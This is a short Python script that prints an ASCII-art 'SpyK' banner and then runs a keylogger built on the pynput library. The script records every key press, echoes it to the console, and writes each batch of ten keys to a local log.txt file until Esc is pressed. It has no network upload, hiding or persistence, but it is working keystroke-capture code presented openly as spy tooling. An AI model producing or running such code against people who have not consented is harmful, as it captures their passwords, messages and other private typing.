print("                                                                         ")
print("    SSSSSSSSSSSSSSS                                          KKKKKKKKK    KKKKKKK")
print("  SS:::::::::::::::S                                         K:::::::K    K:::::K")
print(" S:::::SSSSSS::::::S                                         K:::::::K    K:::::K")
print(" S:::::S     SSSSSSS                                         K:::::::K   K::::::K")
print(" S:::::S           ppppp   pppppppppyyyyyyy           yyyyyyyKK::::::K  K:::::KKK")
print(" S:::::S           p::::ppp:::::::::py:::::y         y:::::y   K:::::K K:::::K   ")
print("  S::::SSSS        p:::::::::::::::::py:::::y       y:::::y    K::::::K:::::K    ")
print("   SS::::::SSSSS   pp::::::ppppp::::::py:::::y     y:::::y     K:::::::::::K     ")
print("     SSS::::::::SS  p:::::p     p:::::p y:::::y   y:::::y      K:::::::::::K     ")
print("        SSSSSS::::S p:::::p     p:::::p  y:::::y y:::::y       K::::::K:::::K    ")
print("             S:::::Sp:::::p     p:::::p   y:::::y:::::y        K:::::K K:::::K   ")
print("             S:::::Sp:::::p    p::::::p    y:::::::::y       KK::::::K  K:::::KKK")
print(" SSSSSSS     S:::::Sp:::::ppppp:::::::p     y:::::::y        K:::::::K   K::::::K")
print(" S::::::SSSSSS:::::Sp::::::::::::::::p       y:::::y         K:::::::K    K:::::K")
print(" S:::::::::::::::SS p::::::::::::::pp       y:::::y          K:::::::K    K:::::K")
print("  SSSSSSSSSSSSSSS   p::::::pppppppp        y:::::y           KKKKKKKKK    KKKKKKK")
print("                    p:::::p               y:::::y                                ")
print("                   p:::::p              y:::::y                                 ")
print("                   p:::::::p            y:::::y                                  ")
print("                   p:::::::p           y:::::y                                   ")
print("                   p:::::::p          yyyyyyy                                    ")
print("                  ppppppppp                                                     ")
print("                                                                                 ")


import pynput
from pynput.keyboard import Key, Listener
count = 0
keys = []
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0}".format(key))
    if count>=10:
        count = 0
        write_file(keys)
        keys = []
def write_file(keys):
    with open("log.txt","w") as f:
        f.write('\n')
        for key in keys:
            k = str(key).replace("'","")
            if k.find("enter") > 0:
                f.write('\n')
            elif k.find("back") > 0:
                f.write('_')
            elif k.find("space") > 0:
                f.write(' ')
            elif k.find("Key") == -1:
                f.write(str(k))

def on_release(key):
    if key ==  Key.esc:
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
